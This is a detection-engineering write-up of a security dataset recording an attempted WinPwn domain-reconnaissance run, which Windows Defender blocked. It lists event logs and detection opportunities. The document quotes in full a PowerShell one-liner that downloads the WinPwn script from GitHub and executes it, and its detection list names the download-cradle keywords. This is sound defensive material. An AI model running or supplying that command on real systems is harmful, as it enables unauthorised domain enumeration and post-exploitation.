# T1087.002-15: Domain Account — WinPwn - generaldomaininfo

## Technique Context

T1087.002 Domain Account Discovery involves enumerating domain user accounts to understand the domain structure and identify potential targets for lateral movement or privilege escalation. Attackers commonly use this technique early in their reconnaissance phase to map out domain users, identify high-value accounts like domain admins, and understand organizational structure. The detection community focuses on identifying suspicious enumeration patterns, especially from non-administrative accounts or unexpected processes, and looks for rapid queries to domain controllers or use of native Windows tools like `net user /domain` or PowerShell Active Directory modules.

This specific test uses WinPwn's `generaldomaininfo` module, a post-exploitation framework that automates common domain reconnaissance tasks. WinPwn is known for combining multiple enumeration techniques and is frequently used by both red teams and real attackers for its comprehensive domain discovery capabilities.

## What This Dataset Contains

This dataset captures an attempt to download and execute WinPwn's domain enumeration module that was blocked by Windows Defender. The key evidence includes:

**PowerShell Execution Chain**: Security 4688 shows the creation of a PowerShell process with the full command line `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') generaldomaininfo -noninteractive -consoleoutput}`, executed under SYSTEM privileges.

**Script Block Logging**: PowerShell 4104 events capture the attempted script execution, showing the `New-Object net.webclient` and the specific WinPwn GitHub URL targeting commit `121dcee26a7aca368821563cbe92b2b5638c5773`.

**Defender Block**: PowerShell 4100 shows the critical blocking event: "This script contains malicious content and has been blocked by your antivirus software" with error ID `ScriptContainedMaliciousContent`.

**DNS Resolution**: Sysmon 22 captures the DNS query for `raw.githubusercontent.com` resolving to GitHub's CDN IPs, showing the network attempt to reach the malicious script.

**Process Monitoring**: Sysmon 1 events show PowerShell process creation (PID 43432) with the full malicious command line, and a `whoami.exe` execution (PID 42984) which appears to be part of the initial reconnaissance.

**Network Artifacts**: Multiple Sysmon 3 events show Windows Defender's MsMpEng.exe making outbound HTTPS connections, likely for signature updates or threat intelligence queries related to the blocked content.

## What This Dataset Does Not Contain

The dataset lacks the actual domain enumeration activity because Windows Defender's real-time protection blocked the script before execution. Consequently, there are no:

- LDAP queries to domain controllers
- Net.exe or other native Windows domain enumeration tool executions  
- PowerShell Active Directory module usage
- Domain controller authentication events
- Registry queries related to domain configuration
- File system artifacts from successful WinPwn execution
- Network traffic to domain controllers showing enumeration queries

The Sysmon ProcessCreate events are limited due to the sysmon-modular include-mode filtering, which captured PowerShell and whoami.exe but may have missed other reconnaissance tools that would have been spawned.

## Assessment

This dataset provides excellent telemetry for detecting attempted domain reconnaissance tool downloads and PowerShell-based attack tool staging, but limited insight into actual domain enumeration techniques since the attack was blocked. The combination of PowerShell script block logging, command-line auditing, and DNS monitoring creates a comprehensive view of the attack attempt. The Defender block demonstrates how endpoint protection can prevent reconnaissance while still generating valuable detection telemetry. For building detections around T1087.002, this data is most valuable for identifying the delivery and staging phase rather than the enumeration execution phase.

## Detection Opportunities Present in This Data

1. **PowerShell Web Download Detection**: Monitor PowerShell 4103/4104 events for `New-Object` combined with `net.webclient` and `downloadstring` patterns, especially targeting GitHub raw content URLs.

2. **WinPwn Framework Indicators**: Alert on PowerShell command lines containing references to S3cur3Th1sSh1t's WinPwn repository URLs or the `generaldomaininfo` function name.

3. **Malicious Script Block Detection**: Correlate PowerShell 4100 error events with error ID `ScriptContainedMaliciousContent` alongside preceding 4104 script block events to identify blocked attack tools.

4. **Suspicious DNS Queries**: Monitor Sysmon 22 events for PowerShell processes querying `raw.githubusercontent.com` or other code hosting platforms, especially when correlated with web client object creation.

5. **Process Command Line Analysis**: Use Security 4688 events to detect PowerShell executions with suspicious command line patterns including `iex`, remote script downloads, and domain reconnaissance keywords.

6. **Endpoint Protection Correlation**: Combine Windows Defender blocking events with process creation and network activity to identify attack attempts that were prevented but generated telemetry.

7. **Reconnaissance Tool Staging**: Alert on PowerShell processes spawning system information gathering tools like `whoami.exe` in close temporal proximity to web download attempts.
